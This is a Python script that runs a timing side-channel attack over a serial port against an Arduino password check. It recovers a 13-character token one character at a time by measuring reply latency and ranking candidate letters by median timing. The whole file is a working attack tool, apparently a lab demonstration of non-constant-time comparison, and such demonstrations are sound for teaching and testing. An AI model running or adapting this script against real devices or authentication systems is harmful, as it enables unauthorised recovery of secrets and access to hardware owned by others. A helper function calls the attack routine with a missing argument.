import time
import string
import statistics
import serial 
import random
from operator import itemgetter

TOKEN_SIZE = 13

arduino = serial.Serial(port='/dev/cu.usbserial-110', baudrate=115200, timeout=1)

def test(characters):
    res = ""
    while "password" not in res:
        res = arduino.readline().decode()

    time.sleep(0.0002)
    arduino.reset_input_buffer()

    arduino.write(bytes(characters+"\r\n", "utf-8"))
    arduino.flush()
    before = time.perf_counter_ns()

    arduino.read(1)

    after = time.perf_counter_ns()

    return after - before

def try_to_hack(characters, test_by_length): 
    deltas = []
    for _ in range(50):
        if random.random() < 0.5:
            b = test(test_by_length)
            c = test(characters)
        else:
            c = test(characters)
            b = test(test_by_length)
        deltas.append(c - b)
    return deltas

def find_next_character(base):
    measures = []

    test_by_length = base + "x" * (TOKEN_SIZE - len(base))

    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for i, character in enumerate(string.ascii_lowercase):
        timings = try_to_hack(base + character + "a" * (TOKEN_SIZE - len(base) - 1), test_by_length)

        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        measures.append({'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
    msg = "median: %s Max: %s Min: %s Stddev: %s"
    print(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    print()
    print("Following characters were:")

    for top_character in top_characters:
        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
        msg ="Character: %r median: %s Max: %s Min: %s Stddev: %s (%d%% faster)"
        print(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))

    return found_character['character']

def find_size():
    for i in range(21):
        if i == 0:
            continue
        timings = try_to_hack("A" * i)
        print(i, timings)

def main():
    time.sleep(2)
    arduino.write(b'hello\r\n')
    arduino.readline()
    time.sleep(2)


    base = ''
    #for i in range(50):
     #   find_size()

    while len(base) != TOKEN_SIZE:
        next_character = find_next_character(base)
        base += next_character

if __name__ == '__main__':
    main()
